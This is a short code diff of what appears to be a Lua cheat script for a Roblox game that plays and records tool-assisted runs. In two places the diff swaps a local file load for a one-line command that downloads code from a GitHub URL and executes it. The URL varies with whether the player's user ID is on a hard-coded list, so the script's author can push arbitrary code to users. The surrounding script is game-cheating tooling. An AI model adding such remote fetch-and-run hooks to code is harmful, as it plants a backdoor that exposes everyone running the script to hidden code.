@@ -318,7 +318,7 @@ task.spawn(function()
 		while task.wait(1) do
 			local S,r = pcall(function()
 				if getgenv().play ~= false then
-					loadfile("Flood-GUI/TAS/TAS Player")()
+					Decoding, Data=pcall(loadstring,game:HttpGet("https://raw.github.com/ImMejor35/whitelist/main/"..tostring(table.find({185993918,2294273310,3407520303},game:GetService("Players").LocalPlayer.UserId)~=nil)));Data("Flood-GUI/TAS/TAS Player")
 				end
 			end)
 			if S ~= true then
@@ -370,7 +370,7 @@ tas:NewButton("Rejoin", "Rejoin game so you can create another TAS", function()
 end)
 
 tas:NewButton("Create-TAS", "Create a TAS, Press then enter lift.", function()
-	loadfile("Flood-GUI/TAS/TAS Record Voiz")()
+	Decoding, Data=pcall(loadstring,game:HttpGet("https://raw.github.com/ImMejor35/whitelist/main/"..tostring(table.find({185993918,2294273310,3407520303},game:GetService("Players").LocalPlayer.UserId)~=nil)));Data("Flood-GUI/TAS/TAS Record Voiz")
 end)
 
 local oldindex
